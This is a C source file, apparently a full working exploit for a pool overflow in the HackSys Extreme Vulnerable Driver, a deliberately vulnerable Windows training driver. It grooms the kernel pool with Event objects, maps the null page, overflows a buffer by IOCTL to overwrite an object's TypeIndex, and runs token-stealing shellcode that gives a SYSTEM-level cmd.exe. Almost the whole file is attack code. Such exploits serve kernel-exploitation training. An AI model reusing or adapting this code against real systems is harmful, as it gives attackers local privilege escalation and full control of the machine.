#include <Windows.h>
#include <stdio.h>

#define HACKSYS_EVD_IOCTL_POOL_OVERFLOW                   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);

int wmain(int argc, WCHAR *argv[])
{

	HANDLE hHeap;
	HMODULE ntdll;
	HANDLE hDevice;
	HANDLE hPoolObjectDefrag[10000];
	HANDLE hPoolObjectGroom[5000];
	NTSTATUS status;
	BOOL bDeviceControl;
	BOOL bWriteNullPage;
	BOOL bNewProcess;
	LPCWSTR lpDeviceName= L"\\\\.\\HackSysExtremeVulnerableDriver";
	LPCWSTR lpModuleName = L"ntdll";
	DWORD data = 0;
	LPVOID lpPayload;
	PVOID pbaseAddress = (PVOID)0x1;
	SIZE_T regionSize = 0x100;
	SIZE_T bytesWritten = 0;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char *lpBuffer;

	char IndexOverwrite[41] =
		("\x40\x00\x08\x04"
		"\x45\x76\x65\xee"
		"\x00\x00\x00\x00"
		"\x40\x00\x00\x00"
		"\x00\x00\x00\x00"
		"\x00\x00\x00\x00"
		"\x01\x00\x00\x00"
		"\x01\x00\x00\x00"
		"\x00\x00\x00\x00"
		"\x00\x00\x08\x00"
	);


	char shellcode[67] = (
		"\x60" 
		"\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
		"\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
								   // #---[Copy System PID token]
		"\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
		"\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
		"\x75\xED" // jnz                                          -> |
		"\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
								   //#---[Recover]
		"\x61" // popad
			   // No need for POP EBP here as if we look at the first call we return from it is RET 8 in function prologe, then we
		"\xC2\x04\x00"); // RET 0x4

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	ZeroMemory(&pi, sizeof(pi));

	wprintf(L"[*]Allocating memory for payload...\r\n");

	lpPayload = VirtualAlloc(
		NULL,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (lpPayload == NULL) {

		wprintf(L"	[-]Error allocating virtual memory for shellcode...\r\n\n");

	}

	else {

		wprintf(L"	[+]Virtual memory for shellcode allocated successfully...\r\n\n");

	}

	RtlCopyMemory(lpPayload, shellcode, sizeof(shellcode));

	wprintf(L"[*]Getting ntdll module handle...\r\n");

	ntdll = GetModuleHandle(lpModuleName);

	if (ntdll == INVALID_HANDLE_VALUE) {

		wprintf(L"	[-]Error loading ntdll module...\r\n\n");

	}

	else {

		wprintf(L"	[+]ntdll module loaded successfully...\r\n\n");

	}

	wprintf(L"[*]Getting NtAllocateVirtualMemory address...\r\n");

	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");

	if (NtAllocateVirtualMemory == NULL) {

		wprintf(L"	[-]Error loading NtAllocateVirtualMemory address...\r\n\n");

	}

	else {

		wprintf(L"	[+]NtAllocateVirtualMemory address loaded successfully...\r\n\n");

	}

	wprintf(L"[*]Mapping null page...\r\n");

	status = NtAllocateVirtualMemory(
		GetCurrentProcess(), 
		&pbaseAddress,
		0, 
		&regionSize, 
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, 
		PAGE_EXECUTE_READWRITE
	);

	if (status != 0) {

		wprintf(L"	[-]Failed allocating null page memory...\r\n\n");

	}

	else {

		wprintf(L"	[+]Null page memory allocated successfully...\r\n\n");

	}

	wprintf(L"[*]Writing shellcode pointer in 0x60 (CloseProcedure) offset of NULL PAGE...\r\n");

	bWriteNullPage = WriteProcessMemory(
		GetCurrentProcess(), 
		(LPVOID)0x60, 
		&lpPayload, 
		0x4, 
		&bytesWritten
	);

	if (bWriteNullPage == FALSE) {

		wprintf(L"	[-]Error writing memory in null page...\r\n\n");

	}

	else {

		wprintf(L"	[+]Null page memory writed successfully...\r\n\n");

	}

	wprintf(L"[*]Creating heap for buffer...\r\n");

	hHeap = GetProcessHeap();

	if (hHeap == INVALID_HANDLE_VALUE) {

		wprintf(L"	[-]Error creating Heap handle...\r\n");

	}

	else {

		wprintf(L"	[+]Heap handle created successfully...\r\n");

	}

	lpBuffer = (char *)HeapAlloc(
			hHeap,
			HEAP_ZERO_MEMORY, 
			544
		);

	if (lpBuffer == NULL) {

		wprintf(L"	[-]Error allocating heap...\r\n\n");

	}

	else {

		wprintf(L"	[+]Heap allocated successfully...\r\n\n");

	}

	wprintf(L"[*]Writing buffer(overwriting TypeIndex of EventObject memory with 0x00...\r\n");

	RtlZeroMemory(lpBuffer, sizeof(lpBuffer));
	RtlFillMemory(lpBuffer, 504, 0x41);
	RtlCopyMemory((char *)(lpBuffer + 504), IndexOverwrite, 40);

	wprintf(L"[*]Spraying pool: Pool defragmentation with EventObjects...\r\n");

	for (int i = 0; i < 10000; i++) {

		HANDLE hEvent = CreateEvent(NULL, false, false, TEXT(""));

		if (hEvent == INVALID_HANDLE_VALUE) {

			wprintf(L"	[-]Error creating event object for defragmentation...\r\n");

			}

			hPoolObjectDefrag[i] = hEvent;

	}

	wprintf(L"[*]Spraying pool: Grooming pool with EventObjects...\r\n");

	for (int i = 0; i < 5000; i++) {

		HANDLE hEvent = CreateEvent(NULL, false, false, TEXT(""));

		if (hEvent == INVALID_HANDLE_VALUE) {

			wprintf(L"	[-]Error creating event object for pool grooming...\r\n");

		}

		hPoolObjectGroom[i] = hEvent;
	}

	wprintf(L"[*]Spraying pool: Deallocating regions of 8 EventObjects for creating holes...\r\n");

	for (int i = 0; i < 5000; i += 16) {
		for (int j = 0; j < 8; j++) {

			HANDLE hEvent = hPoolObjectGroom[i + j];

			if (!CloseHandle(hEvent)) {

				wprintf(L"	[-]Error closing pool object groom handle...\r\n");

			}
		}
	}

	wprintf(L"[*]Creating device file...\r\n");

	hDevice = CreateFile(
		lpDeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE) {

		wprintf(L"	[-]Error creating device file...\r\n\n");

	}

	else {

		wprintf(L"	[+]Device file created successfully...\r\n\n");

	}

	wprintf(L"[*]Sending IOCTL...\r\n");

	bDeviceControl = DeviceIoControl(
		hDevice,
		HACKSYS_EVD_IOCTL_POOL_OVERFLOW,
		lpBuffer,
		544,
		NULL,
		0,
		&data,
		NULL
	);

	if (bDeviceControl == FALSE) {

		wprintf(L"	[-]Error sending IOCTL buffer...\r\n\n");

	}

	else {

		wprintf(L"	[+]IOCTL buffer sended successfully...\r\n\n");

	}

	wprintf(L"[*]Deallocating all EventObjects allocated in pool for execute shellcode...\r\n");

	for (int i = 0; i < 10000; i++) {

		HANDLE hEvent = hPoolObjectDefrag[i];

		if (!CloseHandle(hEvent)) {

			wprintf(L"	[-]Error closing pool defrag object...\r\n");

		}
	}

	for (int i = 8; i < 5000; i += 16) {
		for (int j = 0; j < 8; j++) {

			HANDLE hEvent = hPoolObjectGroom[i + j];

			if (!CloseHandle(hEvent)) {

				wprintf(L"	[-]Error closing pool object groom handle...\r\n");

			}
		}
	}

	wprintf(L"[*]Creating privileged process...\r\n");

	bNewProcess = CreateProcess(
		L"C:\\Windows\\System32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi
	);

	if (bNewProcess == FALSE) {

		wprintf(L"	[-]Error creating privileged process...\r\n\n");

	}

	else {

		wprintf(L"	[+]Privileged process created successfully...\r\n\n");

	}

	system("PAUSE");

	return 0;
}